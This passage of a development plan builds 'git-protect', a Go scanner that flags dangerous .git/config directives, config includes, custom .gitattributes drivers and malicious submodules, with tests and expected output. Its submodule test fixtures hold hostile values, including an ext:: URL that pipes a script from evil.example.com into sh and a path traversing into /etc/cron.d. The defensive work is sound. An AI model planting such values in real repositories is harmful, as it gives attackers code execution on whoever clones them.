	case hasSection("trailer") && hasSuffix("command"):
		return k,
			"Shell command executed by git interpret-trailers. Value: " + v

	case hasSection("trailer") && hasSuffix("cmd"):
		return k,
			"Shell command executed by git interpret-trailers. Value: " + v

	case hasSection("remote") && hasSuffix("uploadpack"):
		return k,
			"Specifies the upload-pack command for git fetch. Value: " + v

	case hasSection("remote") && hasSuffix("receivepack"):
		return k,
			"Specifies the receive-pack command for git push. Value: " + v

	case hasSection("url") && hasSuffix("insteadof"):
		// Reconstruct a display key preserving the url subsection.
		parts := strings.SplitN(k, ".", 3)
		displayKey := k
		if len(parts) == 3 {
			displayKey = "url." + parts[1] + ".insteadOf"
		}
		return displayKey,
			"Silently rewrites remote URLs to attacker-controlled servers. Value: " + v

	case k == "http.sslcainfo":
		return "http.sslCAInfo",
			"Overrides the CA certificate store, enabling MITM on HTTPS git operations. Value: " + v

	case k == "http.sslverify":
		if isDisabled(v) {
			return "http.sslVerify",
				"Disables TLS certificate verification, enabling MITM on HTTPS git operations."
		}

	case k == "http.proxy":
		return "http.proxy",
			"Redirects all HTTPS git traffic through an attacker-controlled proxy. Value: " + v

	case k == "sendemail.smtpserver":
		return "sendemail.smtpserver",
			"Redirects git send-email through an attacker-controlled SMTP server. Value: " + v
	}

	return "", ""
}

// isDisabled returns true if v represents a false/disabled boolean.
func isDisabled(v string) bool {
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "false", "0", "off", "no":
		return true
	}
	return false
}
```

### Step 4 — Run test (expect PASS)

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestConfigScanner -v
```

Expected output:
```
=== RUN   TestConfigScanner_CleanConfig
--- PASS: TestConfigScanner_CleanConfig (0.00s)
=== RUN   TestConfigScanner_FsmonitorAttack
--- PASS: TestConfigScanner_FsmonitorAttack (0.00s)
=== RUN   TestConfigScanner_CorePager
--- PASS: TestConfigScanner_CorePager (0.00s)
=== RUN   TestConfigScanner_CoreEditor
--- PASS: TestConfigScanner_CoreEditor (0.00s)
=== RUN   TestConfigScanner_CoreSshCommand
--- PASS: TestConfigScanner_CoreSshCommand (0.00s)
=== RUN   TestConfigScanner_CoreAskPass
--- PASS: TestConfigScanner_CoreAskPass (0.00s)
=== RUN   TestConfigScanner_CoreHooksPath
--- PASS: TestConfigScanner_CoreHooksPath (0.00s)
=== RUN   TestConfigScanner_CoreGitProxy
--- PASS: TestConfigScanner_CoreGitProxy (0.00s)
=== RUN   TestConfigScanner_CoreAlternateRefsCommand
--- PASS: TestConfigScanner_CoreAlternateRefsCommand (0.00s)
=== RUN   TestConfigScanner_CredentialHelper
--- PASS: TestConfigScanner_CredentialHelper (0.00s)
=== RUN   TestConfigScanner_DiffTextconv
--- PASS: TestConfigScanner_DiffTextconv (0.00s)
=== RUN   TestConfigScanner_DiffExternal
--- PASS: TestConfigScanner_DiffExternal (0.00s)
=== RUN   TestConfigScanner_DifftoolCmd
--- PASS: TestConfigScanner_DifftoolCmd (0.00s)
=== RUN   TestConfigScanner_MergeTool
--- PASS: TestConfigScanner_MergeTool (0.00s)
=== RUN   TestConfigScanner_MergetoolCmd
--- PASS: TestConfigScanner_MergetoolCmd (0.00s)
=== RUN   TestConfigScanner_FilterSmudge
--- PASS: TestConfigScanner_FilterSmudge (0.00s)
=== RUN   TestConfigScanner_FilterClean
--- PASS: TestConfigScanner_FilterClean (0.00s)
=== RUN   TestConfigScanner_FilterProcess
--- PASS: TestConfigScanner_FilterProcess (0.00s)
=== RUN   TestConfigScanner_AliasWithBang
--- PASS: TestConfigScanner_AliasWithBang (0.00s)
=== RUN   TestConfigScanner_AliasWithoutBang_NoFinding
--- PASS: TestConfigScanner_AliasWithoutBang_NoFinding (0.00s)
=== RUN   TestConfigScanner_GpgProgram
--- PASS: TestConfigScanner_GpgProgram (0.00s)
=== RUN   TestConfigScanner_GpgSubkeyProgram
--- PASS: TestConfigScanner_GpgSubkeyProgram (0.00s)
=== RUN   TestConfigScanner_GpgSshDefaultKeyCommand
--- PASS: TestConfigScanner_GpgSshDefaultKeyCommand (0.00s)
=== RUN   TestConfigScanner_SequenceEditor
--- PASS: TestConfigScanner_SequenceEditor (0.00s)
=== RUN   TestConfigScanner_TrailerCommand
--- PASS: TestConfigScanner_TrailerCommand (0.00s)
=== RUN   TestConfigScanner_TrailerCmd
--- PASS: TestConfigScanner_TrailerCmd (0.00s)
=== RUN   TestConfigScanner_RemoteUploadpack
--- PASS: TestConfigScanner_RemoteUploadpack (0.00s)
=== RUN   TestConfigScanner_RemoteReceivepack
--- PASS: TestConfigScanner_RemoteReceivepack (0.00s)
=== RUN   TestConfigScanner_UrlInsteadOf
--- PASS: TestConfigScanner_UrlInsteadOf (0.00s)
=== RUN   TestConfigScanner_HttpSslCAInfo
--- PASS: TestConfigScanner_HttpSslCAInfo (0.00s)
=== RUN   TestConfigScanner_HttpSslVerifyFalse
--- PASS: TestConfigScanner_HttpSslVerifyFalse (0.00s)
=== RUN   TestConfigScanner_HttpSslVerifyTrue_NoFinding
--- PASS: TestConfigScanner_HttpSslVerifyTrue_NoFinding (0.00s)
=== RUN   TestConfigScanner_HttpProxy
--- PASS: TestConfigScanner_HttpProxy (0.00s)
=== RUN   TestConfigScanner_SendemailSmtpServer
--- PASS: TestConfigScanner_SendemailSmtpServer (0.00s)
=== RUN   TestConfigScanner_MultipleKeys_AllReported
--- PASS: TestConfigScanner_MultipleKeys_AllReported (0.00s)
=== RUN   TestConfigScanner_MissingConfigFile_NoError
--- PASS: TestConfigScanner_MissingConfigFile_NoError (0.00s)
=== RUN   TestConfigScanner_ConfigPath
--- PASS: TestConfigScanner_ConfigPath (0.00s)
PASS
```

### Step 5 — Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/config.go internal/scanner/config_test.go
git commit -m "feat: config scanner -- detect 28+ dangerous .git/config directives (CRITICAL)"
```

---

## Task 6: Config-Include Scanner

### Files
- `internal/scanner/configinclude_test.go`
- `internal/scanner/configinclude.go`

---

### Step 1 — Write the test

**File: `internal/scanner/configinclude_test.go`**

```go
package scanner_test

import (
	"context"
	"path/filepath"
	"strings"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func includeConfigScan(t *testing.T, repo string) []scanner.Finding {
	t.Helper()
	m := scanner.NewConfigIncludeModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("configinclude scan error: %v", err)
	}
	return findings
}

func TestConfigInclude_NoIncludes(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	repositoryformatversion = 0
	filemode = true
[remote "origin"]
	url = https://github.com/legit/project.git
`)
	findings := includeConfigScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d: %v", len(findings), findings)
	}
}

func TestConfigInclude_IncludePath_IsCritical(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	repositoryformatversion = 0
[include]
	path = /tmp/attacker.cfg
`)
	findings := includeConfigScan(t, repo)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
	}
	f := findings[0]
	if f.Severity != scanner.Critical {
		t.Errorf("severity = %v, want CRITICAL", f.Severity)
	}
	if f.Module != "config-include" {
		t.Errorf("module = %q, want %q", f.Module, "config-include")
	}
	if !strings.Contains(f.Message, "include.path") {
		t.Errorf("message %q should contain 'include.path'", f.Message)
	}
	if !strings.Contains(f.Detail, "/tmp/attacker.cfg") {
		t.Errorf("detail %q should contain the included path value", f.Detail)
	}
	if !strings.Contains(f.Path, filepath.Join(".git", "config")) {
		t.Errorf("path %q should reference .git/config", f.Path)
	}
}

func TestConfigInclude_IncludeIfGitdir_IsCritical(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	repositoryformatversion = 0
[includeIf "gitdir:/home/victim/projects/"]
	path = /tmp/conditional-attack.cfg
`)
	findings := includeConfigScan(t, repo)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
	}
	f := findings[0]
	if f.Severity != scanner.Critical {
		t.Errorf("severity = %v, want CRITICAL", f.Severity)
	}
	if !strings.Contains(f.Message, "includeIf") {
		t.Errorf("message %q should contain 'includeIf'", f.Message)
	}
}

func TestConfigInclude_IncludeIfOnbranch_IsCritical(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[includeIf "onbranch:main"]
	path = ~/.config/git-attack/config
`)
	findings := includeConfigScan(t, repo)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
	}
	if findings[0].Severity != scanner.Critical {
		t.Errorf("severity = %v, want CRITICAL", findings[0].Severity)
	}
}

func TestConfigInclude_MultipleIncludes_AllReported(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[core]
	repositoryformatversion = 0
[include]
	path = /tmp/first.cfg
[include]
	path = /tmp/second.cfg
[includeIf "gitdir:~/projects/"]
	path = /tmp/conditional.cfg
`)
	findings := includeConfigScan(t, repo)
	if len(findings) != 3 {
		t.Errorf("expected 3 findings, got %d: %v", len(findings), findings)
	}
	for _, f := range findings {
		if f.Severity != scanner.Critical {
			t.Errorf("finding %q: severity = %v, want CRITICAL", f.Message, f.Severity)
		}
	}
}

func TestConfigInclude_MissingConfigFile_NoError(t *testing.T) {
	repo := makeRepo(t)
	m := scanner.NewConfigIncludeModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("scanner must not error on missing config, got: %v", err)
	}
	_ = findings
}

func TestConfigInclude_RelativeIncludePath(t *testing.T) {
	repo := makeRepo(t)
	writeGitConfig(t, repo, `[include]
	path = ../../../tmp/outside-repo.cfg
`)
	findings := includeConfigScan(t, repo)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for relative path include, got %d", len(findings))
	}
}

func TestConfigInclude_ModuleName(t *testing.T) {
	m := scanner.NewConfigIncludeModule()
	if m.Name() != "config-include" {
		t.Errorf("Name() = %q, want %q", m.Name(), "config-include")
	}
}
```

### Step 2 — Run test (expect FAIL)

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestConfigInclude -v 2>&1 | head -10
```

Expected output:
```
./internal/scanner/configinclude_test.go:12:12: undefined: scanner.NewConfigIncludeModule
FAIL    github.com/moldabekov/git-protect/internal/scanner [build failed]
```

### Step 3 — Write the implementation

**File: `internal/scanner/configinclude.go`**

```go
package scanner

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// configIncludeModule detects include.path and includeIf.* directives in
// .git/config. These cause git to merge another config file at parse time,
// giving an attacker a way to inject arbitrary configuration from a path they
// may control or create after the clone.
//
// CVE-2023-29007: overlong submodule URLs can be smuggled into .git/config as
// include directives during a git submodule deinit + add cycle.
type configIncludeModule struct{}

// NewConfigIncludeModule returns a Module that detects config include directives.
func NewConfigIncludeModule() Module {
	return &configIncludeModule{}
}

func (c *configIncludeModule) Name() string { return "config-include" }

func (c *configIncludeModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	cfgPath := filepath.Join(sc.RepoPath, ".git", "config")
	f, err := os.Open(cfgPath)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, nil
		}
		return nil, fmt.Errorf("config-include: open %s: %w", cfgPath, err)
	}
	defer f.Close()

	relPath := filepath.Join(".git", "config")
	var findings []Finding
	sc2 := bufio.NewScanner(f)
	var currentSection string // lowercased full section header including brackets

	for sc2.Scan() {
		line := strings.TrimSpace(sc2.Text())
		if line == "" || line[0] == '#' || line[0] == ';' {
			continue
		}
		if line[0] == '[' {
			currentSection = strings.ToLower(line)
			continue
		}
		// Only care about "path = ..." key=value lines.
		eq := strings.IndexByte(line, '=')
		if eq < 0 {
			continue
		}
		key := strings.ToLower(strings.TrimSpace(line[:eq]))
		if key != "path" {
			continue
		}
		val := strings.TrimSpace(line[eq+1:])
		val = stripInlineComment(val)
		if len(val) >= 2 && val[0] == '"' && val[len(val)-1] == '"' {
			val = val[1 : len(val)-1]
		}

		var directive string
		switch {
		case strings.HasPrefix(currentSection, "[include]"):
			directive = "include.path"
		case strings.HasPrefix(currentSection, `[includeif`):
			cond := extractSubsection(currentSection)
			directive = fmt.Sprintf(`includeIf "%s"`, cond)
		default:
			continue
		}

		findings = append(findings, Finding{
			Severity: Critical,
			Module:   "config-include",
			Path:     relPath,
			Message:  directive,
			Detail: fmt.Sprintf(
				"Config include directive merges an external file at git parse time. "+
					"An attacker can inject any git config directive via the merged file. "+
					"Included path: %s", val),
		})
	}
	if err := sc2.Err(); err != nil {
		return findings, fmt.Errorf("config-include: scan %s: %w", cfgPath, err)
	}
	return findings, nil
}

// extractSubsection pulls the text between the first pair of double-quotes in a
// section header like `[includeif "gitdir:/home/"]`.
func extractSubsection(header string) string {
	start := strings.Index(header, `"`)
	if start < 0 {
		return ""
	}
	end := strings.LastIndex(header, `"`)
	if end <= start {
		return ""
	}
	return header[start+1 : end]
}
```

### Step 4 — Run test (expect PASS)

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestConfigInclude -v
```

Expected output:
```
=== RUN   TestConfigInclude_NoIncludes
--- PASS: TestConfigInclude_NoIncludes (0.00s)
=== RUN   TestConfigInclude_IncludePath_IsCritical
--- PASS: TestConfigInclude_IncludePath_IsCritical (0.00s)
=== RUN   TestConfigInclude_IncludeIfGitdir_IsCritical
--- PASS: TestConfigInclude_IncludeIfGitdir_IsCritical (0.00s)
=== RUN   TestConfigInclude_IncludeIfOnbranch_IsCritical
--- PASS: TestConfigInclude_IncludeIfOnbranch_IsCritical (0.00s)
=== RUN   TestConfigInclude_MultipleIncludes_AllReported
--- PASS: TestConfigInclude_MultipleIncludes_AllReported (0.00s)
=== RUN   TestConfigInclude_MissingConfigFile_NoError
--- PASS: TestConfigInclude_MissingConfigFile_NoError (0.00s)
=== RUN   TestConfigInclude_RelativeIncludePath
--- PASS: TestConfigInclude_RelativeIncludePath (0.00s)
=== RUN   TestConfigInclude_ModuleName
--- PASS: TestConfigInclude_ModuleName (0.00s)
PASS
```

### Step 5 — Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/configinclude.go internal/scanner/configinclude_test.go
git commit -m "feat: config-include scanner -- detect include.path and includeIf directives (CRITICAL)"
```

---

## Task 7: Attributes Scanner

### Files
- `internal/scanner/attributes_test.go`
- `internal/scanner/attributes.go`

---

### Step 1 — Write the test

**File: `internal/scanner/attributes_test.go`**

```go
package scanner_test

import (
	"context"
	"path/filepath"
	"strings"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func attrScan(t *testing.T, repo string) []scanner.Finding {
	t.Helper()
	m := scanner.NewAttributesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("attributes scan error: %v", err)
	}
	return findings
}

func TestAttributesScanner_NoGitattributes(t *testing.T) {
	repo := makeRepo(t)
	findings := attrScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestAttributesScanner_CleanAttributes(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitattributes"), `*.go text eol=lf
*.png binary
*.txt text
Makefile text eol=lf
`)
	findings := attrScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean attributes, got %d: %v", len(findings), findings)
	}
}

func TestAttributesScanner_FilterLfs_NotFlagged(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitattributes"), `*.bin filter=lfs diff=lfs merge=lfs -text
*.mp4 filter=lfs diff=lfs merge=lfs -text
`)
	findings := attrScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for filter=lfs, got %d: %v", len(findings), findings)
	}
}

func TestAttributesScanner_CustomFilter_IsHigh(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitattributes"), "*.c filter=build\n")
	findings := attrScan(t, repo)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
	}
	f := findings[0]
	if f.Severity != scanner.High {
		t.Errorf("severity = %v, want HIGH", f.Severity)
	}
	if f.Module != "attributes" {
		t.Errorf("module = %q, want %q", f.Module, "attributes")
	}
	if !strings.Contains(f.Message, "filter=build") {
		t.Errorf("message %q should contain 'filter=build'", f.Message)
	}
	if !strings.Contains(f.Path, ".gitattributes") {
		t.Errorf("path %q should contain .gitattributes", f.Path)
	}
}

func TestAttributesScanner_CustomDiff_IsHigh(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitattributes"), "*.bin diff=binary-parser\n")
	findings := attrScan(t, repo)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
	}
	if findings[0].Severity != scanner.High {
		t.Errorf("severity = %v, want HIGH", findings[0].Severity)
	}
	if !strings.Contains(findings[0].Message, "diff=binary-parser") {
		t.Errorf("message %q should contain driver name", findings[0].Message)
	}
}

func TestAttributesScanner_CustomMerge_IsHigh(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitattributes"), "*.lock merge=custom-lock-driver\n")
	findings := attrScan(t, repo)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
	}
	if findings[0].Severity != scanner.High {
		t.Errorf("severity = %v, want HIGH", findings[0].Severity)
	}
}

func TestAttributesScanner_BuiltinMergeDrivers_NotFlagged(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitattributes"), `*.txt merge=union
*.go merge=text
`)
	findings := attrScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for built-in merge drivers, got %d: %v", len(findings), findings)
	}
}

func TestAttributesScanner_NestedGitattributes_Scanned(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, "src", "native", ".gitattributes"),
		"*.so filter=native-build\n")
	findings := attrScan(t, repo)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding from nested .gitattributes, got %d: %v", len(findings), findings)
	}
	if !strings.Contains(findings[0].Path, filepath.Join("src", "native", ".gitattributes")) {
		t.Errorf("path %q should reference nested file", findings[0].Path)
	}
}

func TestAttributesScanner_GitDirNotWalked(t *testing.T) {
	repo := makeRepo(t)
	// A .gitattributes inside .git/ must not be scanned.
	writeFile(t, filepath.Join(repo, ".git", "info", ".gitattributes"),
		"*.bin filter=evil\n")
	findings := attrScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings (skipping .git/), got %d", len(findings))
	}
}

func TestAttributesScanner_MultipleCustomDrivers_AllReported(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitattributes"), `*.c   filter=inject
*.h   filter=inject
*.cpp diff=custom-cpp
*.rs  merge=custom-rust
*.bin filter=lfs diff=lfs merge=lfs -text
`)
	findings := attrScan(t, repo)
	// inject on *.c and *.h (2 findings), custom-cpp (1), custom-rust (1) = 4.
	// filter=lfs must not be counted.
	if len(findings) != 4 {
		t.Errorf("expected 4 findings, got %d: %v", len(findings), findings)
	}
}

func TestAttributesScanner_SingleLineMultipleAttrs(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitattributes"),
		"*.bin filter=attack diff=attack merge=attack\n")
	findings := attrScan(t, repo)
	// 3 distinct attribute=driver pairs on one line.
	if len(findings) != 3 {
		t.Errorf("expected 3 findings (filter + diff + merge), got %d: %v", len(findings), findings)
	}
}

func TestAttributesScanner_ModuleName(t *testing.T) {
	m := scanner.NewAttributesModule()
	if m.Name() != "attributes" {
		t.Errorf("Name() = %q, want %q", m.Name(), "attributes")
	}
}
```

### Step 2 — Run test (expect FAIL)

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestAttributesScanner -v 2>&1 | head -10
```

Expected output:
```
./internal/scanner/attributes_test.go:12:12: undefined: scanner.NewAttributesModule
FAIL    github.com/moldabekov/git-protect/internal/scanner [build failed]
```

### Step 3 — Write the implementation

**File: `internal/scanner/attributes.go`**

```go
package scanner

import (
	"bufio"
	"context"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// builtinDrivers contains driver names that are part of git itself and must
// never be flagged. Keyed by lowercase driver name.
var builtinDrivers = map[string]bool{
	"lfs":    true, // Git LFS
	"text":   true, // built-in merge driver
	"binary": true, // built-in merge driver
	"union":  true, // built-in merge driver
	"auto":   true, // built-in diff/merge auto-detection
}

// attrDriverRe matches a filter=NAME, diff=NAME, or merge=NAME token.
// Group 1 is the attribute type (filter/diff/merge), group 2 is the driver name.
var attrDriverRe = regexp.MustCompile(`(?i)\b(filter|diff|merge)=(\S+)`)

// attributesModule walks the repository tree for .gitattributes files and flags
// custom filter/diff/merge driver references.
type attributesModule struct{}

// NewAttributesModule returns a Module that detects custom drivers in .gitattributes.
func NewAttributesModule() Module {
	return &attributesModule{}
}

func (a *attributesModule) Name() string { return "attributes" }

func (a *attributesModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	var findings []Finding

	err := filepath.WalkDir(sc.RepoPath, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil // skip unreadable entries
		}
		// Skip the .git directory entirely.
		if d.IsDir() && d.Name() == ".git" {
			return filepath.SkipDir
		}
		if d.IsDir() || d.Name() != ".gitattributes" {
			return nil
		}
		relPath, relErr := filepath.Rel(sc.RepoPath, path)
		if relErr != nil {
			relPath = path
		}
		fileFindings, scanErr := scanAttributesFile(path, relPath)
		if scanErr != nil {
			fmt.Fprintf(os.Stderr, "git-protect: attributes: %v\n", scanErr)
			return nil
		}
		findings = append(findings, fileFindings...)
		return nil
	})
	if err != nil {
		return findings, fmt.Errorf("attributes: walk %s: %w", sc.RepoPath, err)
	}
	return findings, nil
}

// scanAttributesFile reads a single .gitattributes file and returns findings for
// any custom filter/diff/merge driver references.
func scanAttributesFile(absPath, relPath string) ([]Finding, error) {
	f, err := os.Open(absPath)
	if err != nil {
		return nil, fmt.Errorf("open %s: %w", absPath, err)
	}
	defer f.Close()

	var findings []Finding
	sc := bufio.NewScanner(f)
	lineNum := 0
	for sc.Scan() {
		lineNum++
		line := strings.TrimSpace(sc.Text())
		if line == "" || line[0] == '#' {
			continue
		}
		matches := attrDriverRe.FindAllStringSubmatch(line, -1)
		for _, m := range matches {
			attrType := strings.ToLower(m[1]) // filter / diff / merge
			driver := m[2]
			if builtinDrivers[strings.ToLower(driver)] {
				continue
			}
			findings = append(findings, Finding{
				Severity: High,
				Module:   "attributes",
				Path:     relPath,
				Message: fmt.Sprintf("%s=%s (line %d): %s",
					attrType, driver, lineNum, describeAttrRisk(attrType, driver)),
				Detail: fmt.Sprintf(
					"The custom %s driver %q references a command configured in "+
						"[%s \"%s\"] in .git/config. This causes git to execute "+
						"that command for every matching file during checkout or staging.",
					attrType, driver, attrType, driver),
			})
		}
	}
	return findings, sc.Err()
}

// describeAttrRisk returns a short human-readable description of the risk.
func describeAttrRisk(attrType, driver string) string {
	switch attrType {
	case "filter":
		return fmt.Sprintf("custom filter driver %q runs smudge/clean on checkout/stage", driver)
	case "diff":
		return fmt.Sprintf("custom diff driver %q runs textconv on every diff", driver)
	case "merge":
		return fmt.Sprintf("custom merge driver %q runs merge command on every merge", driver)
	default:
		return fmt.Sprintf("custom %s driver %q may execute code", attrType, driver)
	}
}
```

### Step 4 — Run test (expect PASS)

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestAttributesScanner -v
```

Expected output:
```
=== RUN   TestAttributesScanner_NoGitattributes
--- PASS: TestAttributesScanner_NoGitattributes (0.00s)
=== RUN   TestAttributesScanner_CleanAttributes
--- PASS: TestAttributesScanner_CleanAttributes (0.00s)
=== RUN   TestAttributesScanner_FilterLfs_NotFlagged
--- PASS: TestAttributesScanner_FilterLfs_NotFlagged (0.00s)
=== RUN   TestAttributesScanner_CustomFilter_IsHigh
--- PASS: TestAttributesScanner_CustomFilter_IsHigh (0.00s)
=== RUN   TestAttributesScanner_CustomDiff_IsHigh
--- PASS: TestAttributesScanner_CustomDiff_IsHigh (0.00s)
=== RUN   TestAttributesScanner_CustomMerge_IsHigh
--- PASS: TestAttributesScanner_CustomMerge_IsHigh (0.00s)
=== RUN   TestAttributesScanner_BuiltinMergeDrivers_NotFlagged
--- PASS: TestAttributesScanner_BuiltinMergeDrivers_NotFlagged (0.00s)
=== RUN   TestAttributesScanner_NestedGitattributes_Scanned
--- PASS: TestAttributesScanner_NestedGitattributes_Scanned (0.00s)
=== RUN   TestAttributesScanner_GitDirNotWalked
--- PASS: TestAttributesScanner_GitDirNotWalked (0.00s)
=== RUN   TestAttributesScanner_MultipleCustomDrivers_AllReported
--- PASS: TestAttributesScanner_MultipleCustomDrivers_AllReported (0.00s)
=== RUN   TestAttributesScanner_SingleLineMultipleAttrs
--- PASS: TestAttributesScanner_SingleLineMultipleAttrs (0.00s)
=== RUN   TestAttributesScanner_ModuleName
--- PASS: TestAttributesScanner_ModuleName (0.00s)
PASS
```

### Step 5 — Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/attributes.go internal/scanner/attributes_test.go
git commit -m "feat: attributes scanner -- detect custom filter/diff/merge drivers in .gitattributes (HIGH)"
```

---

## Task 8: Submodules Scanner

### Files
- `internal/scanner/submodules_test.go`
- `internal/scanner/submodules.go`

---

### Step 1 — Write the test

**File: `internal/scanner/submodules_test.go`**

```go
package scanner_test

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func submoduleScan(t *testing.T, repo string) []scanner.Finding {
	t.Helper()
	m := scanner.NewSubmodulesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("submodules scan error: %v", err)
	}
	return findings
}

func TestSubmodulesScanner_NoGitmodules(t *testing.T) {
	repo := makeRepo(t)
	findings := submoduleScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestSubmodulesScanner_CleanGitmodules(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitmodules"), `[submodule "vendor/lib"]
	path = vendor/lib
	url = https://github.com/legit/lib.git
`)
	findings := submoduleScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean .gitmodules, got %d: %v", len(findings), findings)
	}
}

func TestSubmodulesScanner_ExtProtocol_IsCritical(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitmodules"), `[submodule "evil"]
	path = vendor/evil
	url = ext::sh -c "curl http://evil.example.com/attack.sh|sh"
`)
	findings := submoduleScan(t, repo)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for ext:: URL, got %d: %v", len(findings), findings)
	}
	f := findings[0]
	if f.Severity != scanner.Critical {
		t.Errorf("severity = %v, want CRITICAL", f.Severity)
	}
	if f.Module != "submodules" {
		t.Errorf("module = %q, want %q", f.Module, "submodules")
	}
	if !strings.Contains(f.Message, "ext::") {
		t.Errorf("message %q should contain 'ext::'", f.Message)
	}
}

func TestSubmodulesScanner_PathTraversal_IsCritical(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitmodules"), `[submodule "escape"]
	path = ../../../etc/cron.d/attack
	url = https://github.com/attacker/payload.git
`)
	findings := submoduleScan(t, repo)
	if len(findings) < 1 {
		t.Fatalf("expected at least 1 finding for path traversal, got 0")
	}
	var found bool
	for _, f := range findings {
		if strings.Contains(f.Message, "traversal") || strings.Contains(f.Message, "../") {
			found = true
			if f.Severity != scanner.Critical {
				t.Errorf("traversal finding severity = %v, want CRITICAL", f.Severity)
			}
		}
	}
	if !found {
		t.Errorf("no traversal finding in: %v", findings)
	}
}

func TestSubmodulesScanner_CarriageReturnInPath_IsCritical(t *testing.T) {
	// CVE-2025-48384: CR in submodule path causes git to write to a different
	// path than displayed. We embed a literal CR (\r) in the path value.
	repo := makeRepo(t)
	content := "[submodule \"cr\"]\n\tpath = vendor/lib\r\n\turl = https://github.com/legit/lib.git\n"
	writeFile(t, filepath.Join(repo, ".gitmodules"), content)
	findings := submoduleScan(t, repo)
	if len(findings) < 1 {
		t.Fatalf("expected at least 1 finding for CR in path (CVE-2025-48384), got 0")
	}
	var found bool
	for _, f := range findings {
		msg := strings.ToLower(f.Message)
		if strings.Contains(msg, "carriage") || strings.Contains(msg, `\r`) ||
			strings.Contains(msg, "cr") {
			found = true
			if f.Severity != scanner.Critical {
				t.Errorf("CR finding severity = %v, want CRITICAL", f.Severity)
			}
		}
	}
	if !found {
		t.Errorf("no CR-smuggling finding in: %v", findings)
	}
}

func TestSubmodulesScanner_MultipleAttacks_AllReported(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitmodules"), `[submodule "ext-attack"]
	path = vendor/ext
	url = ext::sh -c "id > /tmp/pwned"
[submodule "traversal-attack"]
	path = ../outside-repo
	url = https://github.com/attacker/payload.git
[submodule "legit"]
	path = vendor/legit
	url = https://github.com/legit/project.git
`)
	findings := submoduleScan(t, repo)
	if len(findings) < 2 {
		t.Errorf("expected at least 2 findings, got %d: %v", len(findings), findings)
	}
}

func TestSubmodulesScanner_ExtProtocol_VariousFormats(t *testing.T) {
	urls := []struct {
		name string
		url  string
	}{
		{"ext double colon plain", "ext::git-remote-ext"},
